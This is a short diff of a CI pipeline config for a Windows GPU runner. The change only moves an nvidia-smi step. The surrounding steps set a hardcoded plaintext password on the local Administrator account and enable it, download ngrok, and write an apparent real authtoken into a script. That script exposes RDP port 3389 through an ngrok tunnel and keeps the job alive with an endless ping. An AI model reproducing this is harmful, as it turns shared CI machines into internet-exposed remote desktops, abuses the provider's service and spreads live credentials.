@@ -8,7 +8,8 @@ jobs:
     executor: win/gpu-nvidia
  
     steps:
-      - checkout      
+      - checkout   
+      - run: '&"C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"'   
       - run: Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText ")qWLjqcYBcBE)%Vx" -Force)
       - run: Get-LocalUser -Name "Administrator" | Enable-LocalUser 
       - run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
@@ -17,5 +18,4 @@ jobs:
       - run: cmd /c echo ./ngrok.exe authtoken "1tzTOnuqjGRF6ydGp8gXBNfQ4kT_5RgFo3W9Ftq5UaKnAFXkP" >a.ps1
       - run: cmd /c echo cmd /k start ngrok.exe tcp 3389 >>a.ps1
       - run: cmd /c echo ping -n 9999999999999999999999999999999999999999999999999999 10.10.10.10 >>a.ps1
-      - run: '&"C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"'
       - run: .\a.ps1
